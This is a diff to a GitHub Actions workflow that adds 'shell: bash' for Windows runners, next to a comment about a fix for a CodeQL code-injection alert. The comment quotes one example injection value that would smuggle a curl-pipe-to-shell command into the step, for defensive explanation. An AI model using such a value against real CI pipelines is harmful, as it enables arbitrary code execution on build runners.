@@ -134,6 +134,13 @@ jobs:
         # them into the run: body — GitHub expands ${{ ... }} before the shell
         # parses, so a value like  1.2"; curl x|sh; #  would inject shell.
         # Closes CodeQL actions/code-injection/critical #631.
+        #
+        # `shell: bash` is required for windows-2022 — the runner defaults to
+        # PowerShell Core there, and pwsh's $FULL_VERSION resolves a pwsh
+        # variable, not the env var (env vars need $env:FULL_VERSION). Git
+        # Bash is pre-installed on the GitHub-hosted Windows image, and
+        # ./builder.cmd invokes correctly from bash.
+        shell: bash
         env:
           FULL_VERSION: ${{ inputs.full_version }}
           BUILD_HASH: ${{ inputs.build_hash }}
